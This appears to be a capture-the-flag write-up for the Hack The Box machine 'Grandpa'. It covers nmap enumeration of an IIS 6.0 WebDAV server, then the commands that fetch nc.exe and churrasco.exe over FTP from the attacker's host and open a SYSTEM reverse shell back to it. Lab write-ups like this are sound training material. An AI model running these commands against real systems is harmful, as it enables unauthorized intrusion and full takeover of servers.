# Grandpa (`10.10.10.14`)

## Summary

## `/etc/hosts`

I begin by adding an entry in `/etc/hosts` to resolve `grandpa.htb` to `10.10.10.14`. I use this later in my report.

## Enumeration

I start a portscan of all ports (`-p-`), running OS, service version, and vulnerability scripts (`-A`), skipping host discovery (`-Pn`), with verbose logging (`-v`) and output to a file (`-oN`).

```bash
$ nmap -A -v -p- -Pn -oN allports 10.10.10.14
# Nmap 7.80 scan initiated Tue Sep  1 20:48:42 2020 as: nmap -A -sVC -v -p- -Pn -oA allports 10.10.10.14
adjust_timeouts2: packet supposedly had rtt of -459315 microseconds.  Ignoring time.
adjust_timeouts2: packet supposedly had rtt of -459315 microseconds.  Ignoring time.
adjust_timeouts2: packet supposedly had rtt of -707149 microseconds.  Ignoring time.
adjust_timeouts2: packet supposedly had rtt of -707149 microseconds.  Ignoring time.
Nmap scan report for grandpa.htb (10.10.10.14)
Host is up (0.044s latency).
Not shown: 65534 filtered ports
PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 6.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD COPY PROPFIND SEARCH LOCK UNLOCK DELETE PUT POST MOVE MKCOL PROPPATCH
|_  Potentially risky methods: TRACE COPY PROPFIND SEARCH LOCK UNLOCK DELETE PUT MOVE MKCOL PROPPATCH
|_http-server-header: Microsoft-IIS/6.0
|_http-title: Under Construction
| http-webdav-scan: 
|   Allowed Methods: OPTIONS, TRACE, GET, HEAD, COPY, PROPFIND, SEARCH, LOCK, UNLOCK
|   WebDAV type: Unknown
|   Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH
|   Server Type: Microsoft-IIS/6.0
|_  Server Date: Wed, 02 Sep 2020 01:57:05 GMT
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2003|2008|XP|2000 (91%)
OS CPE: cpe:/o:microsoft:windows_server_2003::sp1 cpe:/o:microsoft:windows_server_2003::sp2 cpe:/o:microsoft:windows_server_2008::sp2 cpe:/o:microsoft:windows_xp::sp3 cpe:/o:microsoft:windows_2000::sp4
Aggressive OS guesses: Microsoft Windows Server 2003 SP1 or SP2 (91%), Microsoft Windows Server 2003 SP2 (91%), Microsoft Windows Server 2008 Enterprise SP2 (90%), Microsoft Windows 2003 SP2 (89%), Microsoft Windows XP SP3 (88%), Microsoft Windows 2000 SP4 (85%), Microsoft Windows XP (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=261 (Good luck!)
IP ID Sequence Generation: Busy server or unknown class
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   47.68 ms 10.10.14.1
2   43.38 ms grandpa.htb (10.10.10.14)

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Sep  1 20:51:13 2020 -- 1 IP address (1 host up) scanned in 151.94 seconds

```

### Reverse Shell

Used https://github.com/g0rx/iis6-exploit-2017-CVE-2017-7269/blob/master/iis6%20reverse%20shell

Transfer `nc.exe` and `churrasco.exe` with FTP.

```bash
$ sudo python3 -m pyftpdlib -p 21

C:\wmpub>echo open 10.10.14.39 > ftp.txt & echo USER anonymous >> ftp.txt & echo password >> ftp.txt & echo bin >> ftp.txt & echo GET nc.exe >> ftp.txt & echo GET churrasco.exe >> ftp.txt & echo bye >> ftp.txt

C:\wmpub>ftp -v -n -s:ftp.txt
```

Get SYSTEM shell with:

```bash
$ sudo nc -lvnp 444

C:\wmpub>churrasco.exe -d "C:\wmpub\nc.exe 10.10.14.39 444 -e cmd.exe"
```